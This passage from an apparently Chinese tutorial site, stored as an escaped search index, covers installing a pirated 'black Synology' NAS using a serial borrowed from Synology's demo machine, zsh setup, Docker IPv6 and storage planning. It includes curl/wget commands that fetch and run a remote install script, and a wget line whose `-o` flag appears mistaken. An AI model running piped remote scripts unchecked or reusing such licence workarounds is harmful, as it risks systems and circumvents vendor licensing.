<p>\u200b\u8fd9\u91cc\u200b\u6d89\u53ca\u200b\u5230\u200b\u7fa4\u6656\u200b\u6d17\u767d\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5148\u200b\u5b89\u88c5\u200b\u540e\u200b\u6d17\u767d\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u8f93\u5165\u200b\u4e00\u4e2a\u200b\u5e8f\u5217\u53f7\u200b\u3002</p> <p> </p> \u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b\uff1a\u200b\u5982\u4f55\u200b\u83b7\u53d6\u200b\u627e\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u5e8f\u5217\u53f7\u200b\u5462\u200b\uff1f <p>\u200b\u53bb\u200b\u7fa4\u6656\u200b\u7684\u200b\u5b98\u7f51\u200b demo \u200b\u4f53\u9a8c\u200b\u4e00\u53f0\u200b\u673a\u5668\u200b\uff0c\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1ahttps://demo.synology.cn/</p> <p>\u200b\u56e0\u4e3a\u200b\u5b98\u7f51\u200b\u7684\u200b Demo \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4e0d\u662f\u200b\u4e00\u53f0\u200b\u771f\u5b9e\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u662f\u200b\u4e00\u53f0\u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u4f46\u200b\u529f\u80fd\u200b\u786e\u5b9a\u200b\u90fd\u200b\u633a\u200b\u5168\u200b\uff01\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u8ba4\u4e3a\u200b\u80af\u5b9a\u200b\u662f\u200b\u4ed6\u4eec\u200b\u7684\u200b\u5e8f\u5217\u53f7\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4ed6\u4eec\u200b\u7684\u200b\u5e8f\u5217\u53f7\u200b\u5f88\u200b\u4e0d\u9519\u200b\uff0c\u200b\u53ef\u60dc\u200b\u4e0b\u200b\u4e00\u79d2\u200b\u5c31\u662f\u200b\u6211\u200b\u7684\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u53eb\u200b\u534a\u200b\u6d17\u767d\u200b\uff0c\u200b\u5b8c\u5168\u200b\u8db3\u591f\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff0cDMS7 \u200b\u5f00\u59cb\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5168\u6d17\u200b\u767d\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u5b98\u65b9\u200b\u5c01\u53f7\u200b\u54e6\u200b\u3002</p> <p>\u200b\u6216\u8005\u200b\u5927\u5bb6\u200b\u8c37\u6b4c\u200b\u81ea\u5df1\u200b\u7684\u200b\u7fa4\u6656\u200b\u578b\u53f7\u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u65b9\u6cd5\u200b\u603b\u200b\u6bd4\u200b\u56f0\u96be\u200b\u591a\u200b\u3002</p> <p>\u200b\u5e8f\u5217\u53f7\u200b\u65e0\u6548\u200b\u4e5f\u200b\u6ca1\u5173\u7cfb\u200b\uff0c\u200b\u70b9\u51fb\u200b\u7ee7\u7eed\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u9009\u62e9\u200b Build the loader \u200b\u6784\u5efa\u200b\u5f15\u5bfc\u200b\uff1a</p> <p> </p> <p>\u200b\u7b49\u5f85\u200b\u6784\u5efa\u200b\u5b8c\u6210\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b Boot the loader \u200b\u4ece\u200b\u5f15\u5bfc\u200b\u4e2d\u200b\u542f\u52a8\u200b\uff1a</p> <p> </p> <p>\u200b\u7b49\u5f85\u200b\u9ed1\u7fa4\u6656\u200b VM \u200b\u542f\u52a8\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_8","title":"\u7cfb\u7edf\u200b\u5b89\u88c5","text":"<p>\u200b\u8bbf\u95ee\u200b VM \u200b\u865a\u62df\u673a\u200b\u7684\u200b 5000 \u200b\u7aef\u53e3\u200b\u5373\u53ef\u200b\u8fdb\u5165\u200b DSM \u200b\u7684\u200b\u5b89\u88c5\u200b\u754c\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u6839\u636e\u200b\u63d0\u793a\u200b\u4ece\u200b Synology \u200b\u4e0b\u8f7d\u200b\u4e2d\u5fc3\u200b\u4e0b\u8f7d\u200b\u6211\u4eec\u200b\u578b\u53f7\u200b\u7684\u200b\u5bf9\u5e94\u200b DSM \u200b\u8865\u4e01\u200b\uff1a</p> <p> </p> <p>\u200b\u6839\u636e\u200b\u63d0\u793a\u200b\uff0c\u200b\u9009\u62e9\u200b\u64e6\u9664\u200b\u8fd9\u4e9b\u200b\u6570\u636e\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u5f00\u59cb\u200b\u8fdb\u5165\u200b DSM \u200b\u7684\u200b\u5b89\u88c5\u200b\u6d41\u7a0b\u200b\uff1a</p> <p> </p> <p>\u200b\u5b89\u88c5\u200b\u5b8c\u5728\u200b\u5f53\u524d\u200b\u7684\u200b\u9875\u9762\u200b\u7b49\u5f85\u200b\u91cd\u542f\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_9","title":"\u7cfb\u7edf\u200b\u8bbe\u7f6e","text":"<p>\u200b\u540e\u9762\u200b\u5c31\u662f\u200b\u5e38\u89c4\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u53ef\u200b\u770b\u5230\u200b\u8fd9\u200b\u7bc7\u6587\u7ae0\u200b\u7684\u200b\u7f51\u53cb\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u7406\u89e3\u200b\u7684\u200b\uff0c\u200b\u56fd\u5149\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5570\u55e6\u200b\u5e9f\u8bdd\u200b\u4e86\u200b\uff0c\u200b\u53ea\u200b\u8bf4\u200b\u4e00\u4e9b\u200b\u5fc5\u8981\u200b\u7684\u200b\uff1a</p> <p>\u200b\u9ed1\u7fa4\u6656\u200b\u6bd5\u7adf\u200b\u662f\u200b\u9ed1\u200b\u7684\u200b\uff0c\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5927\u5bb6\u200b\u968f\u4fbf\u200b\u5347\u7ea7\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u5347\u7ea7\u200b\u8fd8\u200b\u5f97\u200b\u91cd\u65b0\u200b\u6784\u5efa\u200b builder\uff0c\u200b\u5982\u679c\u200b\u5f15\u5bfc\u200b\u6302\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6570\u636e\u200b\u53ef\u80fd\u200b\u5c31\u200b\u6ca1\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u8df3\u8fc7\u200b\u5b98\u65b9\u200b\u8d26\u53f7\u200b\u767b\u5f55\u200b\uff1a</p> <p> </p> <p>\u200b\u80af\u5b9a\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u52fe\u9009\u200b\u6536\u96c6\u200b\u4fe1\u606f\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6839\u636e\u200b\u9700\u8981\u200b\u521b\u5efa\u200b\u5b58\u50a8\u200b\u6c60\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p>"},{"location":"6/10/","title":"\u7ec8\u7aef\u200b\u7f8e\u5316","text":""},{"location":"6/10/#_1","title":"\u6dfb\u52a0\u200b\u793e\u533a\u200b\u6e90","text":"<p>\u200b\u9996\u5148\u200b\u5728\u200b\u5957\u4ef6\u200b\u7fa4\u6656\u200b\u793e\u533a\u200b\u6e90\u200b\uff1ahttps://packages.synocommunity.com</p> <p> </p>"},{"location":"6/10/#_2","title":"\u5b89\u88c5\u200b \u200b\u5957\u4ef6","text":"<p>\u200b\u9996\u5148\u200b\u5b89\u88c5\u200b\u300cZ shell(with modules) \u300d\u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u518d\u200b\u5b89\u88c5\u200b git \u200b\u5957\u4ef6\u200b \uff08\u200b\u540e\u9762\u200b\u5b89\u88c5\u200b oh my zsh \u200b\u63d2\u4ef6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u5230\u200b git \u200b\u547d\u4ee4\u200b\uff09\uff1a</p> <p> </p>"},{"location":"6/10/#shell","title":"\u8bbe\u7f6e\u200b\u9ed8\u8ba4\u200b shell","text":"<p>\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u624b\u52a8\u200b\u5c06\u200b\u9ed8\u8ba4\u200b\u7684\u200b shell \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b zsh shell\uff1a</p> Bash<pre><code>vim ~/.profile\n</code></pre> <p>\u200b\u8ffd\u52a0\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> Bash<pre><code>if [[ -x /usr/local/bin/zsh ]]; then\n  export SHELL=/usr/local/bin/zsh\n  exec /usr/local/bin/zsh\nfi\n</code></pre> <p>\u200b\u5373\u53ef\u200b\u770b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b shell \u200b\u73af\u5883\u200b\u53d8\u6210\u200b\u4e86\u200b zsh \u200b\u73af\u5883\u200b\uff1a</p> Bash<pre><code>echo $SHELL\n</code></pre> <p> </p>"},{"location":"6/10/#oh-my-zsh","title":"\u5b89\u88c5\u200b oh my zsh","text":"<p>zsh \u200b\u547d\u4ee4\u884c\u200b\u4e0b\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code>sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b wget \u200b\u4e0b\u8f7d\u200b\u811a\u672c\u200b\u4e5f\u200b\u884c\u200b\uff1a</p> Bash<pre><code>sh -c \"$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fd8\u5361\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u4f7f\u7528\u200b\u6d4f\u89c8\u5668\u200b\u4e0b\u8f7d\u200b\u7136\u540e\u200b\u4e0a\u200b\u4f20\u5230\u200b\u6211\u4eec\u200b\u7684\u200b DSM \u200b\u4e0a\u200b\uff0c\u200b\u6700\u540e\u200b\u624b\u52a8\u200b\u8fd0\u884c\u200b<code>./install.sh</code> \u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u7b49\u5f85\u200b\u811a\u672c\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b oh my zsh \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u4fee\u590d\u200b\u4e00\u4e0b\u200b\u6743\u9650\u200b\u95ee\u9898\u200b\uff1a</p> Bash<pre><code>sudo chmod 755 /usr/local/bin/zsh\n</code></pre> <p>\u200b\u6700\u540e\u200b\u5b89\u88c5\u200b\u540e\u200b\uff0c\u200b\u968f\u4fbf\u200b\u6362\u4e2a\u200b ys \u200b\u4e3b\u9898\u200b\uff0c\u200b\u6548\u679c\u200b\u8fd8\u662f\u200b\u5f88\u8d5e\u200b\u7684\u200b\uff1a</p> <p> </p>"},{"location":"6/10/#oh-my-zsh_1","title":"oh my zsh \u200b\u63d2\u4ef6\u200b\u5b89\u88c5","text":"<p>\u200b\u4e0b\u9762\u200b\u8fd9\u6b21\u200b\u63d2\u4ef6\u200b\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u5e73\u65f6\u200b\u4f7f\u7528\u200b\u7684\u200b\u63d2\u4ef6\u200b\uff0c\u200b\u5927\u5bb6\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code># \u200b\u547d\u4ee4\u200b\u8865\u5168\u200b\u63d2\u4ef6\u200b\ngit clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions\n\n# \u200b\u8bed\u6cd5\u200b\u9ad8\u4eae\u200b\u63d2\u4ef6\u200b\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting\n</code></pre> <p>\u200b\u7f16\u8f91\u200b <code>.zshrc</code> \u200b\u6587\u4ef6\u200b\u5206\u522b\u200b\u542f\u7528\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u63d2\u4ef6\u200b\uff1a</p> Bash<pre><code>sed -i 's/(git)/(git zsh-syntax-highlighting zsh-autosuggestions)/g' ~/.zshrc\n</code></pre>"},{"location":"6/10/#vim","title":"vim \u200b\u914d\u7f6e","text":"<p>\u200b\u4e0b\u8f7d\u200b\u5bfc\u5165\u200b\u914d\u8272\u200b\u65b9\u6848\u200b\uff1a</p> Bash<pre><code>sudo wget https://html.sqlsec.com/desert.vim -o /usr/share/vim/vim82/colors/desert.vim\n</code></pre> <p>\u200b\u7136\u540e\u200b\u7f16\u8f91\u200b vim \u200b\u914d\u8272\u200b\u6587\u4ef6\u200b\uff1a</p> Bash<pre><code>vim ~/.vimrc\n</code></pre> <p>\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> Bash<pre><code>set nu                \" \u200b\u663e\u793a\u200b\u884c\u53f7\u200b\ncolorscheme desert    \" \u200b\u989c\u8272\u200b\u663e\u793a\u200b\u65b9\u6848\u200b\nsyntax on             \" \u200b\u6253\u5f00\u200b\u8bed\u6cd5\u200b\u9ad8\u4eae\u200b\n</code></pre>"},{"location":"6/11/","title":"Docker\u200b\u4e0e\u200bIPv6","text":""},{"location":"6/11/#_1","title":"\u629b\u51fa\u200b\u95ee\u9898","text":"<p>Docker \u200b\u81ea\u5e26\u200b\u7684\u200b bridge \u200b\u7f51\u6865\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u4e0d\u200b\u652f\u6301\u200b IPv6 \u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u6211\u4eec\u200b\u4e0b\u56fe\u200b\u4f20\u7edf\u200b\u65b9\u6cd5\u200b\u901a\u8fc7\u200b bridge \u200b\u6620\u5c04\u200b\u7684\u200b 8443 \u200b\u548c\u200b 8080 \u200b\u7aef\u53e3\u200b\u65e0\u6cd5\u200b\u88ab\u200b IPv6 \u200b\u7f51\u7edc\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u53ea\u80fd\u200b\u8d70\u200b IPv4 \u200b\u7f51\u7edc\u200b\uff1a</p> <p> </p> <p>\u200b\u4ece\u200b DSM7 \u200b\u5f00\u59cb\u200b\u7fa4\u6656\u200b\u5b98\u65b9\u200b\u4e5f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u6211\u4eec\u200b\u53bb\u200b\u4fee\u6539\u200b Docker \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u800c\u4e14\u200b\u8003\u8651\u200b\u5230\u200b IPv6 \u200b\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u751f\u53d8\u5316\u200b\uff0c\u200b\u6211\u4eec\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u53bb\u200b\u7f16\u8f91\u200b Docker \u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u5f3a\u200b\u5f00\u200b IPv6 \u200b\u7684\u8bdd\u200b\u4e5f\u200b\u5e76\u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u5f88\u200b\u4f18\u96c5\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002\u200b\u9664\u4e86\u200b\u4f7f\u7528\u200b host \u200b\u7f51\u7edc\u200b\u7c7b\u578b\u200b\uff0c\u200b\u5176\u5b9e\u200b\u6211\u4eec\u200b\u8fd8\u6709\u200b\u522b\u7684\u200b\u9009\u62e9\u200b\uff0c\u200b\u5c31\u662f\u200b\u81ea\u5e26\u200b\u7684\u200b Web Station \u200b\u5957\u4ef6\u200b\u3002</p> <p> </p>"},{"location":"6/11/#_2","title":"\u5b9e\u6218\u200b\u6f14\u793a","text":"<p>\u200b\u4e0b\u9762\u200b\u5c31\u200b\u5b9e\u6218\u200b\u6f14\u793a\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u7fa4\u6656\u200b NAS \u200b\u642d\u5efa\u200b\u4e00\u4e2a\u200b\u56fe\u4e66\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\uff0c\u200b\u5e76\u200b\u914d\u7f6e\u200b IPv6 \u200b\u7f51\u7edc\u200b\u6b63\u5e38\u200b\u8bbf\u95ee\u200b\u3002</p>"},{"location":"6/11/#_3","title":"\u4e0b\u8f7d\u200b\u955c\u50cf","text":"<p>\u200b\u6211\u4eec\u200b\u8fd9\u91cc\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b  talebook \u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\uff0c\u200b\u4e00\u6539\u200b Calibre \u200b\u53e4\u8001\u200b\u4e11\u964b\u200b\u7684\u200b\u9875\u9762\u200b\uff0c\u200b\u57fa\u4e8e\u200bVue\u200b\u72ec\u7acb\u200b\u7f16\u5199\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u7b80\u7ea6\u200b\u7f8e\u89c2\u200b\u754c\u9762\u200b\uff0c\u200b\u4f5c\u8005\u200b\u66f4\u65b0\u200b\u8fd8\u200b\u6bd4\u8f83\u200b\u9891\u7e41\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u65b0\u589e\u200b\u4e00\u4e9b\u200b\u5c0f\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u7531\u4e8e\u200b\u622a\u6b62\u200b\u76ee\u524d\u200b2023\u200b\u5e74\u200b02\u200b\u6708\u200b27\u200b\u65e5\u200b\uff0c\u200b\u6700\u65b0\u200b\u7684\u200b 3.6.3 \u200b\u7248\u672c\u200b\u8fd8\u200b\u5b58\u5728\u200b\u4e00\u4e2a\u200b\u5728\u7ebf\u200b\u9605\u8bfb\u200b PDF \u200b\u65e0\u6cd5\u200b\u52a0\u8f7d\u200b\u7684\u200b BUG\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b talebook \u200b\u7684\u200b 3.6.2 \u200b\u7248\u672c\u200b\uff1a</p> <p> </p>"},{"location":"6/11/#_4","title":"\u521b\u5efa\u200b\u5bb9\u5668","text":""},{"location":"6/11/#web-station","title":"Web Station \u200b\u914d\u7f6e","text":""},{"location":"6/11/#ssl","title":"SSL \u200b\u8bc1\u4e66\u200b\u5bfc\u5165","text":""},{"location":"6/11/#_5","title":"\u4e66\u7c4d\u200b\u56fe\u4e66\u200b\u5bfc\u5165","text":""},{"location":"6/11/#_6","title":"\u6700\u7ec8\u200b\u6548\u679c","text":""},{"location":"6/2/","title":"\u5b58\u50a8\u200b\u5212\u5206","text":""},{"location":"6/2/#_1","title":"\u5b58\u50a8\u200b\u8bbe\u8ba1","text":"<p>\u200b\u914d\u5408\u200b\u7fa4\u6656\u200b\u5b98\u7f51\u200b\u7684\u200b RAID \u200b\u5bb9\u91cf\u200b\u8ba1\u7b97\u5668\u200b\uff1ahttps://www.synology.cn/zh-cn/support/RAID_calculator</p> <p>\u200b\u4e0b\u56fe\u200b\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u6574\u4f53\u200b\u7684\u200b\u5b58\u50a8\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u603b\u5171\u200b\u9700\u8981\u200b 6 \u200b\u4e2a\u200b\u5b58\u50a8\u200b\u6c60\u200b\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b 6 \u200b\u4e2a\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u3002</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u7b80\u5355\u200b\u8bf4\u660e\u200b\u4e00\u4e0b\u200b\u4e3a\u4ec0\u4e48\u200b\u6211\u8981\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u539f\u56e0\u200b\uff1a</p> <ol> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 1 \uff1a\u200b\u5bb9\u91cf\u200b\u4e0d\u9519\u200b\uff0c\u200b\u65f6\u5019\u200b\u5b58\u653e\u200b\u65e5\u5e38\u200b\u5f71\u97f3\u200b\u5a92\u4f53\u200b\u548c\u200b\u8bbe\u7f6e\u200b home \u200b\u76ee\u5f55\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 2 \uff1a\u200b\u5bb9\u91cf\u200b\u5927\u200b\uff0c\u200b\u65f6\u5019\u200b\u5b58\u653e\u200b\u65e5\u5e38\u200b\u5f71\u97f3\u200b\u5a92\u4f53\u200b\u548c\u200b\u5b58\u653e\u200b\u65e5\u5e38\u200b\u8d44\u6599\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 3 \uff1a2 \u200b\u4e2a\u200b 2TB \u200b\u5e0c\u6377\u200b\u5782\u76f4\u200b\u786c\u76d8\u200b\uff0c\u200b\u505a\u200b raid1 \u200b\u9635\u5217\u200b\u5b58\u653e\u200b\u91cd\u8981\u200b\u6570\u636e\u200b\u4e5f\u200b\u6709\u200b\u4e00\u5b9a\u200b\u4fdd\u969c\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 4 \uff1a3 \u200b\u4e2a\u200b 1TB \u200b\u786c\u76d8\u200b\u7ec4\u200b raid0 \u200b\u5962\u4f88\u200b\u4e00\u4e0b\u200b\u5427\u200b\uff0c\u200b\u53ea\u200b\u5b58\u653e\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u8f6f\u4ef6\u200b\u548c\u200b\u7cfb\u7edf\u200b\u955c\u50cf\u200b\u5565\u200b\u7684\u200b\uff0c\u200b\u6216\u8005\u200b\u526a\u8f91\u200b\u89c6\u9891\u200b\u7684\u200b\u4e34\u65f6\u200b\u4ea7\u7269\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 5 \uff1a1TB SATA MLC SSD \u200b\u5c3d\u91cf\u200b\u53d1\u6325\u200b\u51fa\u200b\u4f18\u52bf\u200b\u6765\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8dd1\u200b Docker \u200b\u6216\u8005\u200b\u6570\u636e\u5e93\u200b\u7b49\u200b\u9700\u8981\u200b\u8bfb\u5199\u200b\u8981\u6c42\u200b\u7684\u200b\u670d\u52a1\u200b</li> <li>\u200b\u5b58\u50a8\u200b\u6c60\u200b 6\uff1a\u200b\u8fd9\u4e2a\u200b 3 TB \u200b\u5386\u53f2\u200b\u4e0a\u200b\u8fd8\u200b\u68c0\u6d4b\u200b\u51fa\u574f\u200b\u9053\u200b\uff0c\u200b\u8f6f\u4ef6\u200b\u5148\u200b\u5c4f\u853d\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f30\u8ba1\u200b\u79bb\u6302\u200b\u4e86\u200b\u4e5f\u200b\u4e0d\u8fdc\u200b\u5427\u200b\uff0c\u200b\u5c31\u200b\u505a\u200b\u4e34\u65f6\u200b\u4e0b\u200b\u7740\u200b\u7247\u5b50\u200b\u5b58\u653e\u200b</li> </ol>"},{"location":"6/2/#_2","title":"\u6700\u7ec8\u200b\u7ed3\u6784","text":"<p>\u200b\u7b2c\u4e00\u6b21\u200b\u4f7f\u7528\u200b\u5212\u5206\u200b\u5b58\u50a8\u200b\u6c60\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5efa\u8bae\u200b\u78c1\u76d8\u200b\u68c0\u67e5\u200b\u4e00\u904d\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5fc3\u7406\u200b\u6709\u200b\u4e2a\u6570\u200b\uff0c\u200b\u6570\u636e\u200b\u624d\u200b\u53ef\u4ee5\u200b\u5b89\u5fc3\u200b\u5b58\u653e\u200b\uff0c\u200b\u54ea\u6015\u200b\u8981\u200b\u8017\u8d39\u200b\u4e0d\u5c11\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd8\u662f\u200b\u5f88\u200b\u503c\u5f97\u200b\u7684\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u201c\u200b\u78e8\u5200\u4e0d\u8bef\u780d\u67f4\u5de5\u200b\u201d\u3002</p> <p>\u200b\u6700\u7ec8\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b\u56fe\u6765\u200b\u5b9e\u64cd\u200b\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u5e03\u7f6e\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u670b\u53cb\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u6211\u200b\u7684\u200b SSD \u200b\u6ca1\u6709\u200b\u7528\u200b\uff0c\u200b\u4e0d\u8981\u200b\u614c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b SSD \u200b\u53ef\u4ee5\u200b\u540e\u9762\u200b\u5f53\u505a\u200b\u7f13\u5b58\u200b\u76d8\u6765\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u4ee5\u53ca\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u7a7a\u200b\u786c\u76d8\u200b\u56fe\u6807\u200b\uff1a</p> <p> </p> <p>\u200b\u6211\u4eec\u200b\u4e5f\u200b\u4e00\u5e76\u200b\u6765\u200b\u89e3\u51b3\u200b\u3002 </p>"},{"location":"6/3/","title":"SSD\u200b\u7f13\u5b58","text":""},{"location":"6/3/#_1","title":"\u629b\u51fa\u200b\u95ee\u9898","text":"<p>\u200b\u7ec6\u5fc3\u200b\u6216\u8005\u200b\u6709\u200b\u5f3a\u8feb\u75c7\u200b\u7684\u200b\u670b\u53cb\u200b\u4e00\u5b9a\u200b\u6ce8\u610f\u200b\u5230\u200b\u4e86\u200b\u6211\u4eec\u200b\u7fa4\u6656\u200b\u7684\u200b\u786c\u76d8\u200b\u4fe1\u606f\u200b\u91cc\u9762\u200b\u5c45\u7136\u200b\u6ca1\u6709\u200b\u8bc6\u522b\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b\u786c\u76d8\u200b\uff0c\u200b\u660e\u660e\u200b\u6211\u4eec\u200b\u5df2\u7ecf\u200b\u63d2\u200b\u4e86\u200b 10 \u200b\u5757\u200b\u786c\u76d8\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u7684\u200b\u786c\u76d8\u200b\u5c5e\u4e8e\u200b\u6269\u5c55\u200b\u786c\u76d8\u200b\uff0c\u200b\u7f16\u53f7\u200b\u662f\u4ece\u200b 7 \u200b\u5f00\u59cb\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u800c\u200b\u8fd9\u4e2a\u200b\u56fe\u6807\u200b\u91cc\u9762\u200b\u53ea\u200b\u8bc6\u522b\u200b\u677f\u8f7d\u200b\u786c\u76d8\u200b\uff0c\u200b\u7f16\u53f7\u200b\u5e94\u8be5\u200b\u4e3a\u200b 1\u30012\u30013\u30014 \u200b\u624d\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u663e\u793a\u200b\u3002</p>"},{"location":"6/3/#_2","title":"\u89e3\u51b3\u200b\u65b9\u6cd5","text":"<p>\u200b\u65e2\u7136\u200b\u7fa4\u6656\u200b\u53ea\u200b\u663e\u793a\u200b\u677f\u8f7d\u200b\u786c\u76d8\u200b\uff0c\u200b\u90a3\u200b\u80af\u5b9a\u200b\u8fd8\u6709\u200b\u5c0f\u4f19\u4f34\u200b\u6709\u200b\u7591\u95ee\u200b\uff0c\u200b\u4e0d\u200b\u5bf9\u200b\u554a\u200b\uff0c\u200b\u4e3a\u5565\u200b\u6211\u4eec\u200b\u7684\u200b\u5f15\u5bfc\u200b\u7684\u200b\u786c\u76d8\u200b\u662f\u200b\u677f\u8f7d\u200b\u7684\u200b\u6ca1\u6709\u200b\u8bc6\u522b\u200b\u5462\u200b\uff1f</p> <p> </p> 